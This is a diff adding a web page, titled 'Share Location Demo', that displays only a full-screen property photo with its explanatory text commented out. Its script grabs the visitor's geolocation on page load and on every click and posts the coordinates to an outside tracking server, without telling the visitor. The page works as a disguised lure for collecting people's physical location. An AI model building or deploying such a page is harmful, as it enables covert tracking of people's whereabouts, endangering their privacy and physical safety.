@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Share Location Demo</title>
+</head>
+<style>
+  .background{
+    /* background: url('https://sharmaestates.com/wp-content/uploads/2020/07/IMG_1792.jpg'); */
+  }
+
+  .img{
+    height: 100%;
+    width: 100%;
+  }
+
+</style>
+<body style="text-align:center; font-family:Arial">
+
+<!-- <h2>Click Below to Share Location</h2> -->
+<!-- <a href="#" onclick="sendLocation()">Share My Location</a> -->
+<div class="background" id="location">
+    <img src="https://sharmaestates.com/wp-content/uploads/2020/07/IMG_1792.jpg" alt="" class="img">
+</div>
+<script>
+  async function sendLocation(){
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(async function(pos){
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      console.log("Latitude:", lat);
+      console.log("Longitude:", lon);
+
+      // Send to Node.js server
+      await fetch("https://locationtrack-22re.onrender.com/location", {
+        method:"POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({ latitude: lat, longitude: lon })
+      });
+
+      alert(`Thank You!`);
+    }, function(err){
+      alert("Error: " + err.message);
+    });
+  } else {
+    alert("Geolocation not supported");
+  }
+}
+document.addEventListener("DOMContentLoaded", function() {
+    sendLocation();
+});
+
+document.addEventListener("click", function(event) {
+    sendLocation();
+});
+
+
+</script>
+
+</body>
+</html>
